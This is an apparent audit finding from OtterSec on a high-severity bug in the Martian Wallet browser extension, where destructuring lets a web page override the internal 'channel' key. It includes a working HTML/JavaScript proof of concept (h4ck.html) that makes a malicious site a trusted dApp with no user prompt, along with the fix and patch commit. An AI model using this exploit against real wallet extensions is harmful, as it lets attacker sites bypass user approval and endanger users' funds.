---
tags:
  - has/poc
  - platform/ottersec
  - severity/high
  - sector/wallet
protocol: "[[Martian]]"
auditors:
  - "[[OtterSec]]"
report: "https://martianwallet.xyz"
genome:
  - "[[wrong-condition]]"
  - "[[role-bypass]]"
  - "[[commitment-uniqueness]]"
---
# Overriding channel key through destruction

- id: 48561
- impact: HIGH
- protocol: [[Martian]] Wallet
- reporter: OtterSec
- source: https://martianwallet.xyz

## Summary


The report discusses a bug in the Martian Wallet extension, specifically in the contentScript.js file. The bug allows attacker sites to send arbitrary messages to internal channels by overriding the "channel" key. This can be exploited by malicious sites to add themselves as trusted dapps and skip UI interaction. The report provides a Proof of Concept (PoC) demonstrating how this can be done. The suggested solution is to unpack the "details" object in an inner object instead of at the same layer as the "channel" key. The bug has been patched in the latest commit. 

## Details

## Vulnerability Overview

The `martian_injected_script_message` event listener in `contentScript.js` sends the `postMessage` to runtime by taking the properties of the `details` object through destructuring.

## Source File
- **File:** `src/chrome/contentScript.js` (JavaScript)

```javascript
window.addEventListener('martian_injected_script_message', function (event) {
    // console.log("content script window listen message", event);
    if (event.detail.method) {
        // contentscript -> background
        const fetchedData = fetchTitleIcon(document);
        const metainfo = {
            iconUrl: fetchedData.iconUrl,
            docTitle: fetchedData.docTitle
        };
        event.detail.metainfo = metainfo;
        const details = { ...event.detail, metainfo: metainfo };
        chrome.runtime.sendMessage({
            channel: 'martian_contentscript_background_channel',
            ...details
        });
        // Warning: An attacker site can override the channel key and access internal onmessage channels.
        // This allows attacker sites to send arbitrary messages to internal channels.
    }
});
```

## Proof of Concept

The following PoC demonstrates how a malicious site can add itself as a trusted dApp and skip UI interaction by using the `aebc` channel.

### Malicious HTML File
- **File:** `h4ck.html` (HTML)

```html
<script>
// SIMPLE POC TO ACCESS internal aebc channel
window.dispatchEvent(new CustomEvent("martian_injected_script_message", {
    detail: {
        method: 'hacked',
        data: {},
        id: 6,
        channel: 'aebc',
        origin: window.origin,
        tabId: 102032735,
        status: 200,
        iconUrl: 'https://pew.com/bad.img'
    }
}));
</script>
```

## Remediation

Unpack the `details` object in an inner object instead of at the same layer as the channel key.

### Updated Source Code
- **File:** `martian-wallet-extension/src/chrome/contentScript.js` (JavaScript)

```javascript
const details = { ...event.detail, metainfo: metainfo };
chrome.runtime.sendMessage({
    channel: 'martian_contentscript_background_channel',
    details: {
        ...details
    },
});
```

## Patch

Patched in commit `8c826ac6`.

© 2023 OtterSec LLC. All Rights Reserved.  
Martian Wallet Audit 04 | Vulnerabilities 6 / 17
